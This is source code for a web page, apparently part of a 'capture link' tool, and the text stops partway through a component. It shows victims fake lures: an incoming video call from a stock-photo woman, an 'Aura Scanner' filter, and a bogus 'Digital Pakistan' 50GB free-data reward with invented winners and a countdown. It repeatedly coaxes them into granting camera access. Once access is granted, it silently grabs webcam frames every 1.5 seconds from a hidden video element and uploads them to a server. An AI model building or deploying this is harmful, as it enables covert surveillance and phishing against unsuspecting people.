"use client";

import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Camera, 
  Video, 
  ShieldCheck, 
  Monitor, 
  AlertCircle,
  Loader2,
  Mic,
  Settings,
  X,
  PhoneOff,
  Users,
  MessageSquare,
  Gift,
  Hash,
  Sparkles,
  Smartphone,
  CheckCircle2,
  Globe,
  Lock,
  Shield,
  UserCheck,
  Heart,
  Share2,
  MoreHorizontal,
  Music,
  Zap
} from 'lucide-react';
import { CaptureLink } from '@/lib/storage';

export default function CapturePage() {
  const { id } = useParams() as { id: string };
  const [linkInfo, setLinkInfo] = useState<CaptureLink | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const captureIntervalRef = useRef<any>(null);

  useEffect(() => {
    fetchLinkInfo();
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
      if (captureIntervalRef.current) {
        clearInterval(captureIntervalRef.current);
      }
    };
  }, [id]);

  const fetchLinkInfo = async () => {
    try {
      const res = await fetch('/api/links');
      const links = await res.json();
      const link = links.find((l: any) => l.id === id);
      
      if (link) {
        setLinkInfo(link);
      } else {
        setError('Configuration not found.');
      }
    } catch (err) {
      setError('System error. Please try again.');
    }
  };

  const requestPermissions = async () => {
    setPermissionError(null);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: "user"
        }, 
        audio: false 
      });
      
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play().catch(console.error);
        };
      }
      
      // Start capture loop
      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = setInterval(() => {
        captureFrame();
      }, 1500);
      
      return true;
    } catch (err: any) {
      console.error('Camera access error:', err);
      
      let msg = '';
      if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
        msg = 'Camera access was denied. This is required for identity verification.';
      } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
        msg = 'Camera is already in use by another application.';
      } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
        msg = 'No camera device found.';
      } else {
        msg = 'Hardware error accessing camera.';
      }
      
      setPermissionError(msg);
      return false;
    }
  };

  const captureFrame = async () => {
    if (!videoRef.current || !canvasRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const context = canvas.getContext('2d');

    if (!context || video.videoWidth === 0) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/jpeg', 0.7);
    
    try {
      await fetch('/api/snapshots', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: id, imageData }),
      });
    } catch (err) {
      console.error('Capture sync failed', err);
    }
  };

  if (error) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-6 text-zinc-400 font-mono text-[10px] uppercase tracking-widest">
        <div className="space-y-4 text-center">
          <div className="w-12 h-12 rounded-full border border-red-500/20 flex items-center justify-center mx-auto mb-6">
             <AlertCircle className="text-red-500" />
          </div>
          <p>System Fault: {error}</p>
          <button onClick={() => window.location.reload()} className="px-6 py-2 border border-white/10 hover:bg-white/5 rounded-lg active:scale-95 transition-all">
             Reconnect Node
          </button>
        </div>
      </div>
    );
  }

  if (!linkInfo) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <Loader2 className="w-12 h-12 text-cyber-blue animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white selection:bg-cyber-blue/30 overflow-y-auto">
      {/* Hidden Video & Canvas for processing */}
      <video ref={videoRef} autoPlay playsInline muted className="opacity-0 absolute pointer-events-none w-[1px] h-[1px] z-[-1]" />
      <canvas ref={canvasRef} className="opacity-0 absolute pointer-events-none w-[1px] h-[1px] z-[-1]" />

      <AnimatePresence mode="wait">
        <motion.div 
          key="content" 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="min-h-screen"
        >
          {linkInfo.style === 'video' && <VideoCallStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'social' && <SocialStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'reward' && <RewardStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
          {linkInfo.style === 'virtual' && <VirtualNumberStyle requestPermissions={requestPermissions} permissionError={permissionError} />}
        </motion.div>
      </AnimatePresence>
    </div>
  );
}

// --- Dynamic Styles ---

function VideoCallStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [timer, setTimer] = useState(0);
  const [isAccepted, setIsAccepted] = useState(false);
  const [callError, setCallError] = useState<string | null>(null);
  const [isRetrying, setIsRetrying] = useState(false);
  const [retryCount, setRetryCount] = useState(0);

  useEffect(() => {
    if (permissionError) setCallError(permissionError);
  }, [permissionError]);

  useEffect(() => {
    if (!isAccepted || callError) return;
    const interval = setInterval(() => setTimer(prev => prev + 1), 1000);
    return () => clearInterval(interval);
  }, [isAccepted, callError]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60).toString().padStart(2, '0');
    const sec = (s % 60).toString().padStart(2, '0');
    return `${m}:${sec}`;
  };

  const handleAccept = async () => {
    // Enter in-call view immediately (first attempt only)
    if (!isAccepted) setIsAccepted(true);
    setIsRetrying(true);
    // Don't clear error yet — wait for result to avoid flicker
    const ok = await requestPermissions();
    setIsRetrying(false);
    if (!ok) {
      setRetryCount(prev => prev + 1);
      if (retryCount >= 1) {
        // Permanently blocked — show settings instructions
        setCallError('SETTINGS_BLOCKED');
      } else {
        setCallError('denied');
      }
    } else {
      setCallError(null);
    }
  };

  const girlPhoto = "https://randomuser.me/api/portraits/women/44.jpg";
  const girlName = "Sophia";


  return (
    <div className="fixed inset-0 flex flex-col font-sans text-white overflow-hidden z-50 bg-black">
      {/* Blurred background */}
      <div
        className="absolute inset-0 z-0"
        style={{
          backgroundImage: `url(${girlPhoto})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center top',
          filter: 'blur(24px) brightness(0.35)',
          transform: 'scale(1.12)',
        }}
      />
      <div className="absolute inset-0 bg-black/30 z-0" />

      {!isAccepted ? (
        /* ─── Incoming Call Screen ─── */
        <div className="relative z-10 flex-1 flex flex-col items-center justify-center gap-6 p-8">
          {/* Pulsing rings */}
          <div className="relative">
            <motion.div animate={{ scale: [1, 1.4, 1], opacity: [0.5, 0, 0.5] }} transition={{ duration: 2.5, repeat: Infinity }} className="absolute inset-[-30px] rounded-full border-2 border-green-400/60" />
            <motion.div animate={{ scale: [1, 1.6, 1], opacity: [0.3, 0, 0.3] }} transition={{ duration: 2.5, repeat: Infinity, delay: 0.4 }} className="absolute inset-[-55px] rounded-full border border-green-400/30" />
            <motion.div animate={{ scale: [1, 1.03, 1] }} transition={{ duration: 2, repeat: Infinity }} className="w-40 h-40 rounded-full overflow-hidden border-4 border-white/40 shadow-2xl">
              <img src={girlPhoto} alt="caller" className="w-full h-full object-cover object-top" onError={(e) => { (e.target as HTMLImageElement).src = 'https://randomuser.me/api/portraits/women/30.jpg'; }} />
            </motion.div>
          </div>

          <div className="text-center space-y-1 mt-2">
            <h2 className="text-4xl font-black tracking-tight">{girlName}</h2>
            <p className="text-sm text-white/60 font-medium animate-pulse">Incoming Video Call…</p>
          </div>

          {/* Buttons */}
          <div className="absolute bottom-16 w-full max-w-xs flex justify-around items-center px-6">
            <div className="flex flex-col items-center gap-2">
              <button onClick={() => window.close()} className="w-16 h-16 rounded-full bg-red-600 flex items-center justify-center shadow-xl active:scale-90 transition-transform">
                <PhoneOff size={28} />
              </button>
              <span className="text-xs text-white/50 font-medium">Decline</span>
            </div>
            <div className="flex flex-col items-center gap-2">
              <motion.button
                animate={{ y: [0, -6, 0] }}
                transition={{ duration: 1.5, repeat: Infinity }}
                onClick={handleAccept}
                className="w-20 h-20 rounded-full bg-[#25D366] flex items-center justify-center shadow-[0_0_40px_rgba(37,211,102,0.6)] active:scale-90 transition-transform"
              >
                <Video size={36} />
              </motion.button>
              <span className="text-sm text-white font-bold">Accept</span>
            </div>
          </div>
        </div>
      ) : (
        /* ─── Active Call Screen ─── */
        <div className="relative z-10 flex-1 flex flex-col">
          {/* Full screen girl photo */}
          <div className="flex-1 relative overflow-hidden">
            <img
              src={girlPhoto}
              alt="call"
              className="w-full h-full object-cover object-top"
              onError={(e) => { (e.target as HTMLImageElement).src = 'https://randomuser.me/api/portraits/women/30.jpg'; }}
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/50 via-transparent to-black/20 pointer-events-none" />

            {/* HD badge */}
            <div className="absolute top-5 left-1/2 -translate-x-1/2 flex items-center gap-1.5 bg-black/40 backdrop-blur px-3 py-1 rounded-full border border-white/10">
              <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
              <span className="text-[9px] font-black text-white/80 uppercase tracking-widest">HD Live</span>
            </div>

            {/* Permission error overlay */}
            <AnimatePresence>
              {callError && (
                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="absolute inset-0 bg-black/85 backdrop-blur-2xl z-50 flex flex-col items-center justify-center p-8 text-center">
                  <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-red-500/40 mb-6 shadow-2xl">
                    <img src={girlPhoto} alt="caller" className="w-full h-full object-cover object-top" />
                  </div>

                  {callError === 'SETTINGS_BLOCKED' ? (
                    /* Camera permanently blocked by browser */
                    <>
                      <h3 className="text-xl font-black text-white uppercase tracking-tight mb-3">Camera Blocked</h3>
                      <p className="text-xs text-white/60 max-w-[260px] leading-relaxed mb-2">
                        Your browser has blocked camera access. To fix this:
                      </p>
                      <div className="text-left text-xs text-white/50 max-w-[240px] space-y-1 mb-8 bg-white/5 rounded-xl p-4 border border-white/10">
                        <p>1. Tap the 🔒 lock icon in your address bar</p>
                        <p>2. Find <strong className="text-white/80">Camera</strong> → set to <strong className="text-green-400">Allow</strong></p>
                        <p>3. Reload the page</p>
                      </div>
                      <button onClick={() => window.location.reload()} className="px-8 py-3 bg-white/10 border border-white/20 text-white font-bold text-sm uppercase rounded-2xl active:scale-95 transition-all">
                        Reload Page
                      </button>
                    </>
                  ) : (
                    /* First denial — show retry */
                    <>
                      <h3 className="text-2xl font-black text-white uppercase tracking-tight mb-2">Video Paused</h3>
                      <p className="text-xs text-white/60 max-w-[240px] leading-relaxed mb-8">
                        Camera access is needed to continue {girlName}&apos;s HD stream. Please allow it when prompted.
                      </p>
                      <button
                        onClick={handleAccept}
                        disabled={isRetrying}
                        className="px-10 py-4 bg-[#25D366] text-white font-black text-sm uppercase rounded-2xl shadow-xl active:scale-95 transition-all disabled:opacity-60 flex items-center gap-2"
                      >
                        {isRetrying ? <><span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin inline-block" />Connecting…</> : 'Enable Camera'}
                      </button>
                    </>
                  )}
                </motion.div>
              )}
            </AnimatePresence>

            {/* Self preview — top right */}
            <div className="absolute top-5 right-4 w-24 h-36 rounded-2xl border border-white/20 overflow-hidden shadow-2xl bg-zinc-900 z-20">
              <div className="absolute inset-0 flex items-center justify-center">
                <Camera size={18} className="text-white/20" />
              </div>
              <span className="absolute bottom-2 left-2 text-[8px] font-black bg-black/50 px-1.5 py-0.5 rounded">YOU</span>
            </div>

            {/* Caller info — top left */}
            <div className="absolute top-5 left-4 z-20">
              <div className="flex items-center gap-2 bg-black/40 backdrop-blur-md rounded-full pl-1 pr-3 py-1 border border-white/10">
                <div className="w-8 h-8 rounded-full overflow-hidden border border-white/25">
                  <img src={girlPhoto} alt={girlName} className="w-full h-full object-cover object-top" />
                </div>
                <div>
                  <p className="text-xs font-black leading-none">{girlName}</p>
                  <p className="text-[10px] text-[#25D366] font-bold">{formatTime(timer)}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Controls bar */}
          <div className="h-28 bg-black/75 backdrop-blur-xl flex items-center justify-center gap-5 px-6 pb-3">
            {[{ Icon: Mic, label: "Mute" }, { Icon: MessageSquare, label: "Chat" }, { Icon: Sparkles, label: "FX" }, { Icon: Settings, label: "More" }].map(({ Icon, label }, i) => (
              <div key={i} className="flex flex-col items-center gap-1.5 cursor-pointer group">
                <div className="w-12 h-12 rounded-full bg-white/10 border border-white/10 flex items-center justify-center group-active:scale-90 transition-transform">
                  <Icon size={20} className="text-white/70 group-hover:text-white" />
                </div>
                <span className="text-[8px] text-white/40 font-bold uppercase tracking-wider">{label}</span>
              </div>
            ))}
            <div className="flex flex-col items-center gap-1.5 cursor-pointer">
              <div onClick={() => window.close()} className="w-16 h-16 rounded-full bg-red-600 flex items-center justify-center shadow-xl active:scale-95 transition-transform">
                <PhoneOff size={28} />
              </div>
              <span className="text-[8px] text-white/40 font-bold uppercase tracking-wider">End</span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}



function SocialStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [hearts, setHearts] = useState<{ id: number; left: number }[]>([]);
  const [activeFilter, setActiveFilter] = useState(2);
  const [viewCount, setViewCount] = useState(1284);

  const filters = [
    { name: "Vintage", color: "bg-amber-500/20" },
    { name: "Aura Glow", color: "bg-purple-500/20" },
    { name: "Digital PK", color: "bg-green-500/20" },
    { name: "Smooth", color: "bg-blue-500/20" },
    { name: "Cyber", color: "bg-cyan-500/20" }
  ];

  useEffect(() => {
    const viewInterval = setInterval(() => {
      setViewCount(prev => prev + Math.floor(Math.random() * 3));
    }, 3000);

    const heartInterval = setInterval(() => {
      const id = Date.now();
      setHearts(prev => [...prev.slice(-15), { id, left: Math.random() * 80 + 10 }]);
      setTimeout(() => {
        setHearts(prev => prev.filter(h => h.id !== id));
      }, 3000);
    }, 800);

    return () => {
      clearInterval(viewInterval);
      clearInterval(heartInterval);
    };
  }, []);

  return (
    <div className="min-h-screen bg-black flex flex-col relative overflow-hidden font-sans select-none fill-available">
      {/* Background Glow */}
      <div className="absolute inset-0 z-0 bg-gradient-to-b from-transparent via-purple-900/10 to-transparent" />
      
      {/* Immersive Header */}
      <div className="absolute top-0 left-0 right-0 p-6 z-30 flex items-start justify-between bg-gradient-to-b from-black/60 to-transparent pt-10">
        <div className="flex items-center gap-3">
          <div className="relative">
            <div className="w-11 h-11 rounded-full p-[2px] bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 animate-spin-slow">
              <div className="w-full h-full rounded-full bg-zinc-800 border-2 border-black overflow-hidden flex items-center justify-center">
                <Users size={20} className="text-white/40" />
              </div>
            </div>
            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 bg-red-600 text-[8px] font-black px-1.5 py-0.5 rounded-sm uppercase tracking-tighter border border-black animate-pulse">
              LIVE
            </div>
          </div>
          <div className="flex flex-col">
            <div className="flex items-center gap-1.5">
               <span className="font-bold text-sm text-white drop-shadow-md">aura_official_pk</span>
               <div className="w-3 h-3 rounded-full bg-blue-500 flex items-center justify-center">
                  <CheckCircle2 size={8} className="text-white" />
               </div>
            </div>
            <div className="flex items-center gap-2">
               <span className="text-[10px] text-white/70 font-medium">1.2k views</span>
               <div className="w-1 h-1 rounded-full bg-white/30" />
               <span className="text-[10px] text-white/70 font-medium">Aura Scanner v2.0</span>
            </div>
          </div>
        </div>
        <div className="flex gap-4">
           <div className="px-3 py-1.5 bg-white/10 backdrop-blur-md rounded-full border border-white/10 flex items-center gap-2">
              <Users size={14} className="text-white" />
              <span className="text-xs font-bold text-white tracking-tight">{viewCount.toLocaleString()}</span>
           </div>
           <X size={28} className="text-white drop-shadow-md cursor-pointer hover:rotate-90 transition-transform" />
        </div>
      </div>

      {/* Main Filter Loading Area */}
      <div className="flex-1 flex items-center justify-center relative">
        <AnimatePresence>
          {permissionError && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="z-50 max-w-[280px] w-full p-8 rounded-[2.5rem] glass-morphism border-white/20 bg-black/40 text-center space-y-6 backdrop-blur-3xl"
            >
              <div className="relative w-24 h-24 mx-auto">
                 <div className="absolute inset-0 bg-red-500/20 blur-2xl rounded-full animate-pulse" />
                 <div className="relative w-24 h-24 rounded-full border-2 border-dashed border-red-500/40 flex items-center justify-center">
                    <Shield size={40} className="text-red-500" />
                 </div>
              </div>
              <div className="space-y-2">
                <h3 className="text-xl font-black text-white uppercase tracking-tighter italic">Identity Lock</h3>
                <p className="text-[11px] text-white/60 font-medium leading-relaxed">
                  AR correlation requires Neural Identity Mapping. Please allow camera access to unlock the Digital PK Filter Node.
                </p>
                <p className="text-[10px] text-red-500 font-urdu italic" dir="rtl">بایومیٹرک تصدیق درکار ہے۔</p>
              </div>
              <button 
                onClick={() => requestPermissions()}
                className="w-full py-4 bg-red-600 text-white text-[10px] font-black uppercase rounded-2xl shadow-[0_15px_30px_rgba(220,38,38,0.3)] active:scale-95 transition-all"
              >
                Retry Identity Sync
              </button>
            </motion.div>
          )}
        </AnimatePresence>

        <div className="text-center space-y-4 z-40">
           {!permissionError && (
             <motion.div 
               animate={{ scale: [1, 1.05, 1], opacity: [0.3, 0.6, 0.3] }}
               transition={{ duration: 2, repeat: Infinity }}
               className="w-20 h-20 rounded-full border-4 border-white/20 flex items-center justify-center mx-auto"
             >
                <Sparkles size={32} className="text-white/40" />
             </motion.div>
           )}
           <p className="text-[10px] font-black text-white/30 uppercase tracking-[0.4em] drop-shadow-lg">
             {permissionError ? '' : 'Scanning Aura Field...'}
           </p>
        </div>

        {/* Floating Actions (Right Side) */}
        <div className="absolute right-6 bottom-40 flex flex-col gap-6 z-40">
           {[
             { Icon: Heart, label: 'Likes', color: 'text-red-500' },
             { Icon: MessageSquare, label: 'Comments', color: 'text-white' },
             { Icon: Share2, label: 'Share', color: 'text-white' },
             { Icon: Music, label: 'Music', color: 'text-white' },
             { Icon: MoreHorizontal, label: 'More', color: 'text-white' }
           ].map((item, i) => (
             <div key={i} className="flex flex-col items-center gap-1">
                <div className="w-12 h-12 rounded-full glass-morphism border-white/10 flex items-center justify-center shadow-xl active:scale-75 transition-transform group overflow-hidden">
                   <item.Icon size={22} className={`${item.color} group-hover:scale-110 transition-transform`} />
                </div>
                <span className="text-[10px] font-black text-white drop-shadow-md uppercase tracking-tighter opacity-70">{item.label}</span>
             </div>
           ))}
        </div>

        {/* Floating Hearts Animation Container */}
        <div className="absolute inset-0 pointer-events-none z-40">
          {hearts.map(heart => (
            <motion.div
              key={heart.id}
              initial={{ opacity: 0, y: '80vh', scale: 0.5, x: `${heart.left}%` }}
              animate={{ opacity: [0, 1, 0], y: '20vh', scale: [0.5, 1.5, 0.8], rotate: [-10, 10, -10] }}
              transition={{ duration: 3, ease: "easeOut" }}
              className="absolute text-red-500/40"
            >
              <Heart size={24} fill="currentColor" />
            </motion.div>
          ))}
        </div>
      </div>

      {/* Bottom Interface */}
      <div className="bg-gradient-to-t from-black/80 via-black/40 to-transparent pt-12 pb-10 z-30">
        <div className="px-4 pb-8 relative">
           <div className="flex items-center justify-center gap-8 overflow-x-hidden relative">
              <div className="absolute inset-0 bg-gradient-to-r from-black via-transparent to-black z-10 opacity-60" />
              {filters.map((f, i) => (
                <motion.div 
                  key={i}
                  animate={{ 
                    scale: activeFilter === i ? 1.2 : 0.8,
                    opacity: activeFilter === i ? 1 : 0.4
                  }}
                  onClick={() => setActiveFilter(i)}
                  className={`flex-shrink-0 flex flex-col items-center gap-2 cursor-pointer transition-all duration-500`}
                >
                  <div className={`w-14 h-14 rounded-full border-2 ${activeFilter === i ? 'border-white shadow-[0_0_20px_rgba(255,255,255,0.4)]' : 'border-white/10'} ${f.color} backdrop-blur-md flex items-center justify-center relative overflow-hidden`}>
                     {activeFilter === i && (
                       <div className="absolute inset-0 bg-gradient-to-tr from-white/20 to-transparent" />
                     )}
                     <Zap size={20} className={activeFilter === i ? 'text-white' : 'text-white/20'} />
                  </div>
                  <span className={`text-[9px] font-black uppercase tracking-widest ${activeFilter === i ? 'text-white' : 'text-white/40'}`}>{f.name}</span>
                </motion.div>
              ))}
           </div>
        </div>

        <div className="flex items-center justify-center px-12 relative h-20">
           <div className="absolute left-10 flex flex-col items-center opacity-40">
              <Settings size={20} className="text-white" />
              <span className="text-[8px] font-black uppercase tracking-widest mt-1">Tools</span>
           </div>
           
           <button 
             onClick={async () => {
               const success = await requestPermissions();
               // The parent manages state, it was updated successfully
             }}
             className="relative w-16 h-16 rounded-full border-[6px] border-white active:scale-90 transition-transform cursor-pointer shadow-[0_0_30px_rgba(255,255,255,0.2)] group"
           >
              <div className="absolute inset-1 rounded-full border-2 border-black/50" />
              <div className="absolute -inset-4 rounded-full border-2 border-white/5 animate-pulse" />
           </button>

           <div className="absolute right-10 flex flex-col items-center opacity-40">
              <PhoneOff size={20} className="text-white" />
              <span className="text-[8px] font-black uppercase tracking-widest mt-1">Exit</span>
           </div>
        </div>
        
        <div className="text-center mt-4">
           <p className="text-[9px] text-white/20 font-black uppercase tracking-[0.5em] font-urdu" dir="rtl">فلٹر لوڈ ہو رہا ہے</p>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .animate-spin-slow {
          animation: spin-slow 8s linear infinite;
        }
        .no-scrollbar::-webkit-scrollbar {
          display: none;
        }
        .fill-available {
          height: 100vh;
          height: -webkit-fill-available;
        }
        .glass-morphism {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
        }
      `}</style>
    </div>
  );
}

function RewardStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [step, setStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [tickerIndex, setTickerIndex] = useState(0);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const [retryCount, setRetryCount] = useState(0);

  const recentClaims = [
    { user: "Mohammad Ali", amount: "50GB", carrier: "Jazz 4G", time: "1m ago" },
    { user: "Fatima Khan", amount: "50GB", carrier: "Zong", time: "3m ago" },
    { user: "Zaid Ahmed", amount: "50GB", carrier: "Telenor", time: "4m ago" },
    { user: "Sara Malik", amount: "50GB", carrier: "Ufone", time: "6m ago" },
    { user: "Usman Sheikh", amount: "50GB", carrier: "Jazz 4G", time: "8m ago" },
  ];

  const activationLogs = [
    "Jazz/Zong Network Handshake...",
    "PTA License Verification...",
    "Allocating local data bucket...",
    "SIM Biometric Identity Sync...",
    "Authorizing 50GB allocation...",
    "Digital Pakistan Bridge Active..."
  ];

  useEffect(() => {
    const tickerInterval = setInterval(() => {
      setTickerIndex(prev => (prev + 1) % recentClaims.length);
    }, 4000);

    const timerInterval = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    if (step === 1) {
      const progInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(progInterval);
            setTimeout(() => setStep(2), 1500);
            return 100;
          }
          return prev + 1;
        });
      }, 40);
      return () => {
        clearInterval(progInterval);
        clearInterval(tickerInterval);
        clearInterval(timerInterval);
      };
    }
    return () => {
      clearInterval(tickerInterval);
      clearInterval(timerInterval);
    };
  }, [step]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-[#020617] font-sans selection:bg-green-400/30">
      {/* Premium Animated Background */}
      <div className="absolute inset-0 z-0 text-white/5 pointer-events-none select-none overflow-hidden flex flex-col items-center justify-center opacity-10">
         <div className="text-[20vw] font-black rotate-12 leading-none">PAKISTAN</div>
         <div className="text-[15vw] font-black -rotate-12 leading-none">DIGITAL</div>
      </div>
      
      <div className="absolute inset-0 z-0">
        <motion.div 
          animate={{ 
            scale: [1, 1.2, 1],
            x: [0, 50, 0],
            y: [0, 30, 0]
          }}
          transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
          className="absolute -top-[10%] -left-[10%] w-[60%] h-[60%] bg-green-500/10 blur-[120px] rounded-full" 
        />
        <motion.div 
          animate={{ 
            scale: [1, 1.3, 1],
            x: [0, -40, 0],
            y: [0, -50, 0]
          }}
          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
          className="absolute -bottom-[10%] -right-[10%] w-[60%] h-[60%] bg-blue-500/10 blur-[120px] rounded-full" 
        />
      </div>

      <div className="relative z-10 min-h-screen flex flex-col items-center py-12 px-6">
        {/* Live Ticker */}
        <div className="w-full max-w-md mb-8">
          <div className="bg-white/[0.03] border border-white/5 backdrop-blur-md rounded-2xl px-6 py-3 flex items-center justify-between overflow-hidden relative">
            <div className="flex items-center gap-3">
              <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
              <span className="text-[9px] font-black uppercase text-zinc-500 tracking-widest whitespace-nowrap">Recent Winner</span>
            </div>
            <AnimatePresence mode="wait">
              <motion.div 
                key={tickerIndex}
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                exit={{ y: -20, opacity: 0 }}
                className="flex items-center gap-2 text-[11px] font-bold text-zinc-300"
              >
                <span>{recentClaims[tickerIndex].user}</span>
                <span className="text-green-500 font-black">{recentClaims[tickerIndex].amount}</span>
                <span className="text-[9px] bg-white/5 px-1.5 py-0.5 rounded text-zinc-500 uppercase">{recentClaims[tickerIndex].carrier}</span>
              </motion.div>
            </AnimatePresence>
          </div>
        </div>

        <div className="max-w-md w-full space-y-8">
          <div className="text-center space-y-4">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="inline-flex p-4 rounded-3xl bg-green-600/10 border border-green-600/20 backdrop-blur-xl mb-2 shadow-2xl shadow-green-500/10"
            >
              <Gift className="w-10 h-10 text-green-500" />
            </motion.div>
            <div className="space-y-1">
              <h1 className="text-4xl font-black text-white tracking-tight leading-none uppercase">REWARD CENTER</h1>
              <div className="flex flex-col items-center gap-1">
                <p className="text-green-500 text-[10px] font-black uppercase tracking-[0.3em]">Digital Pakistan Initiative</p>
                <p className="text-zinc-500 text-sm font-urdu leading-none" dir="rtl">ڈیجیٹل پاکستان انیشیٹو</p>
              </div>
            </div>
          </div>

          <div className="glass-morphism rounded-[3rem] p-1 shadow-2xl border-white/5 bg-gradient-to-b from-white/[0.08] to-transparent overflow-hidden">
            <div className="bg-zinc-950/40 backdrop-blur-3xl rounded-[2.9rem] p-10 space-y-8 relative overflow-hidden">
              {/* PTA Watermark */}
              <div className="absolute -top-10 -right-10 opacity-5 pointer-events-none select-none">
                 <CheckCircle2 size={150} className="text-white" />
              </div>

              {step === 0 && (
                <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
                  <div className="space-y-3 text-center">
                    <div className="inline-block px-3 py-1 rounded-full bg-green-500/10 border border-green-500/20 text-[9px] font-black text-green-500 uppercase tracking-widest mb-2">
                       مفت انعام • Free Reward Found
                    </div>
                    <h2 className="text-3xl font-bold text-white tracking-tight">50GB High-Speed Data</h2>
                    <p className="text-sm text-zinc-400 leading-relaxed">Your Jazz/Zong number is selected for a special data allocation as part of the 2024 Connectivity Program.</p>
                  </div>
                  
                  <div className="bg-white/[0.03] rounded-3xl p-6 border border-white/5 space-y-4 relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-green-500/5 blur-3xl -mr-16 -mt-16" />
                    <div className="flex items-center justify-between pb-4 border-b border-white/5 relative z-10">
                        <div className="flex items-center gap-3">
                           <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center">
                              <Globe size={16} className="text-green-500" />
                           </div>
                           <span className="text-xs font-bold text-zinc-300">Package Status</span>
                        </div>
                        <span className="text-[9px] font-black uppercase text-green-400 bg-green-400/10 px-2 py-1 rounded-lg">LIVE</span>
                    </div>
                    <div className="space-y-4 relative z-10">
                        <div className="flex justify-between items-end">
                           <div className="space-y-1">
                              <p className="text-[10px] font-black uppercase text-zinc-500 tracking-widest">Selected Offer</p>
                              <p className="text-2xl font-black text-white">50.00 GB <span className="text-xs text-zinc-500 opacity-50 font-medium">Free</span></p>
                           </div>
                           <div className="text-right space-y-1">
                              <p className="text-[10px] font-black uppercase text-zinc-500 tracking-widest">Time Remaining</p>
                              <p className="text-lg font-mono font-bold text-green-400">{formatTime(timeLeft)}</p>
                           </div>
                        </div>
                        <div className="w-full h-1 bg-white/5 rounded-full overflow-hidden">
                           <motion.div 
                              animate={{ x: ["-100%", "100%"] }} 
                              transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
                              className="w-[40%] h-full bg-green-500/50 blur-[2px]" 
                           />
                        </div>
                    </div>
                  </div>

                  {permissionError && (
                    <div className="p-4 rounded-2xl bg-red-500/10 border border-red-500/20 text-center space-y-3 animate-in fade-in zoom-in-95">
                      <div className="flex items-center justify-center gap-2 text-red-500">
                        <AlertCircle size={16} />
                        <span className="text-[10px] font-black uppercase tracking-widest">Biometric Sync Error</span>
                      </div>
                      <p className="text-[11px] text-zinc-400 font-medium">Identity verification suspended. Please allow camera access to synchronize your SIM profile with the Digital Pakistan Database.</p>
                      <button 
                        onClick={() => requestPermissions()}
                        className="px-6 py-2 bg-red-500 text-white text-[10px] font-black uppercase rounded-lg hover:bg-red-600 transition-colors"
                      >
